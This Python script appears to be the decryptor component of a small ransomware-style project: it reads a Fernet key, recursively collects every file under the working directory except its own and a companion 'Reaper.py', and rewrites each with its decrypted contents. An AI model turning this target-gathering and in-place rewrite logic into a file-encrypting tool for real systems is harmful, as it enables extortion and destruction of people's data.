import os
from cryptography.fernet import Fernet
from threading import Thread

def get_key():
    with open("key.key", "rb") as key_file:
        return key_file.read()


class Saviour(Thread):
    targets = []

    def gather_targets(self, path=os.getcwd()):
        for file in os.scandir(path):
            name = file.path.split("\\")[-1]

            if name == "Reaper.py" or name == "key.key" or name == "Saviour.py":
                continue

            if file.is_dir():
                if name == "venv" or name == ".git" or name == "inspectionProfiles" or name == ".idea":
                    continue
                self.gather_targets(file)

            else:
                self.targets.append(file.path)

    def decrypt(self, key_to_decrypt):
        for file in self.targets:
            with open(file, "rb") as target_file:
                cipher = target_file.read()
                plain_text = Fernet(key_to_decrypt).decrypt(cipher)

            with open(file, "wb") as target_file:
                target_file.write(plain_text)

        print("Done.")

    def run(self):
        key = get_key()
        self.gather_targets()
        self.decrypt(key)


Saviour().start()
